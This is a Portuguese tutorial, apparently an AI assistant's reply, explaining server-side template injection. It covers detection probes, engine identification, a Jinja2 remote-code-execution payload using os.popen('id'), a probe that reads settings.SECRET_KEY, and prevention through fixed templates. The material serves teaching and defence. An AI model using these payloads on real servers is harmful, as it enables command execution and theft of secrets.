## 🧩 SSTI — Server-Side Template Injection

A **SSTI (Server-Side Template Injection)** acontece quando uma aplicação web **insere dados controlados pelo usuário diretamente em um template**, permitindo que o mecanismo de templates interprete essa entrada como código ou expressão de template.

👉 O problema é diferente de XSS: no **XSS**, o código é interpretado pelo navegador da vítima; no **SSTI**, a interpretação ocorre **no servidor**, pelo mecanismo de templates.

---

## ⚙️ Como acontece

Aplicações web utilizam mecanismos de template para gerar páginas dinamicamente.

Exemplo:

```php
$output = $twig->render(
    "Dear {first_name},",
    array("first_name" => $user->first_name)
);
```

O objetivo é que:

```text
Nome → Paulo
```

gere:

```text
Dear Paulo,
```

O problema aparece quando a entrada do usuário é colocada **dentro do template** de maneira insegura.

Fluxo vulnerável:

```text
Entrada do usuário
       ↓
Template
       ↓
Template Engine
       ↓
Interpretação
       ↓
Output
```

---

# 🧪 Identificando SSTI

Uma forma comum de verificar se uma entrada está sendo interpretada pelo template é utilizar uma expressão matemática simples.

Entrada:

```text
Olá {{7*7}} tudo bem?
```

Se a aplicação retornar:

```text
Olá 49 tudo bem?
```

isso indica que:

```text
{{7*7}}
   ↓
Template Engine
   ↓
49
```

📌 Isso é um forte indício de **SSTI**.

Se retornar literalmente:

```text
Olá {{7*7}} tudo bem?
```

a entrada provavelmente está sendo tratada como texto.

---

# 🌐 SSTI em parâmetros de URL

Dependendo do template engine utilizado:

```text
http://example.com/?username={{7*7}}
```

ou:

```text
http://example.com/{{self}}
```

Outro formato encontrado em determinados engines:

```text
http://example.com/?username=${7*7}
```

⚠️ A sintaxe depende do mecanismo utilizado pela aplicação.

---

# 📝 SSTI em campos de entrada

Por exemplo:

```html
<form name="ssti" action="index.html" method="POST">
    <label for="nome">Nome: </label>
    <input name="nome" type="text" value="{{7*7}}"/><br/>

    <label for="senha">Senha: </label>
    <input name="senha" type="password" value="" /><br/>

    <input name="button" type="submit" class="button" value="Enviar">
</form>
```

Uma entrada como:

```text
{{7*7}}
```

pode ser utilizada para verificar se o mecanismo está interpretando expressões.

---

# 📡 SSTI em requisições HTTP

Também pode ser testada diretamente em parâmetros de uma requisição:

```http
POST /endpoint-detail HTTP/1.1
Host: example.com

parameter={{7*7}}
```

Outro exemplo específico de determinados engines:

```http
POST /endpoint-detail HTTP/1.1
Host: example.com

parameter={% debug %}
```

E, em ambientes onde esse objeto está disponível:

```http
POST /endpoint-detail HTTP/1.1
Host: example.com

parameter={{settings.SECRET_KEY}}
```

📌 Esses payloads **não são universais**. O payload correto depende do template engine e do contexto em que a entrada é processada.

---

# 🔍 Descobrindo o Template Engine

A sintaxe pode ajudar a identificar o mecanismo utilizado.

|Template Engine|Exemplo|
|---|---|
|**Twig**|`{{7*7}}`|
|**Jinja2**|`{{7*7}}`|
|**FreeMarker**|`${7*7}`|
|**Velocity**|`$variable`|
|**ERB**|`<%= 7*7 %>`|

Por isso, durante um pentest, normalmente começamos com expressões simples:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
```

e observamos a resposta.

---

# 💻 SSTI → RCE

Um dos principais motivos pelos quais SSTI é considerada perigosa é que, em determinados engines e configurações, ela pode evoluir de:

```text
SSTI
 ↓
acesso a objetos/métodos
 ↓
acesso a funcionalidades do servidor
 ↓
execução de comandos
 ↓
RCE
```

No caso de aplicações **Python/Jinja2** vulneráveis, um payload frequentemente demonstrado em laboratórios é:

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Esse payload tenta alcançar o módulo `os` através dos objetos disponíveis no contexto do template e executar:

```bash
id
```

retornando a saída para o template.

📌 No payload que você enviou faltava uma aspa no `id`; a forma sintaticamente correta é:

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

⚠️ Esse exemplo é **específico de determinados cenários Jinja2/Flask** e não funciona genericamente em qualquer SSTI.

---

# 🎯 Impactos

Dependendo do template engine e das permissões do processo:

- exposição de informações;
- acesso a objetos internos;
- vazamento de dados;
- exposição de secrets;
- alteração do conteúdo gerado;
- acesso a arquivos;
- execução de comandos;
- **RCE (Remote Code Execution)**.

---

# 🆚 SSTI × XSS

Essa diferença é importante:

|SSTI|XSS|
|---|---|
|Server-Side|Client-Side|
|Executado no servidor|Executado no navegador|
|Explora Template Engine|Explora interpretação HTML/JS|
|Pode levar a RCE|Normalmente afeta o contexto do navegador|
|Ex.: Jinja2, Twig|Ex.: HTML/JavaScript|

Exemplo:

```text
XSS
Usuário → servidor → navegador → JavaScript
```

Enquanto:

```text
SSTI
Usuário → servidor → Template Engine → código
```

---

# 🛡️ Como prevenir

### ❌ Evite

Construir templates utilizando entrada do usuário:

```python
template = "Olá " + username
render_template_string(template)
```

### ✅ Prefira

Manter o **template fixo** e passar o valor como variável:

```python
render_template(
    "index.html",
    username=username
)
```

No template:

```jinja2
Olá {{ username }}
```

Dessa forma:

```text
Usuário
   ↓
username
   ↓
variável
   ↓
template pré-definido
```

em vez de:

```text
Usuário
   ↓
código do template
   ↓
Template Engine
   ↓
💥 SSTI
```

---

## 📌 Regra de ouro

👉 **Dados fornecidos pelo usuário devem ser tratados como dados, nunca como parte do código/template.**

```text
Entrada do usuário
       ↓
Variável
       ↓
Template fixo
       ↓
Renderização
       ↓
HTML
```

**SSTI ocorre quando o dado consegue atravessar essa fronteira e ser interpretado como uma expressão do template.**